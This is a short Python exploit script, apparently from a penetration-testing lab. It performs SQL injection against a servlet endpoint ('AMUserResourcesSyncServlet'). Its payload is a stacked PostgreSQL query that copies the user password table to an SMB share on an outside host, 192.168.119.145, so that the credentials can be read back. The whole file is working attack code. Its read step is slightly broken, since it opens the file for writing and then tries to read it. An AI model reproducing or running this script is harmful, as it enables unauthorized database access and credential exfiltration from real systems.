#(m4ud) PostgreSQL script send tables over SMB

import requests
import time

def message(message):
    print(message)


def makerequest(target,payload):
    params={'ForMasRange':'1','userId':'1{0}'.format(payload)}
    r=requests.get(target,params=params, verify=False)
    if r.status_code==200:
        time.sleep(2)
        try:
            with open('getdata.txt','w') as data:
                credentials=data.read().split('\t')[1:3]
                message('Web app credentials are:')
                message(credentials)
        except Exception:
            message('Not getdata file')

def main():
    target='https://mn:8443/servlet/AMUserResourcesSyncServlet'
    payload=';copy (select * from am_userpasswordtable) to $$\\\\192.168.119.145\\share\\getdata.txt$$;'
    makerequest(target,payload)

if __name__=='__main__':
    main()
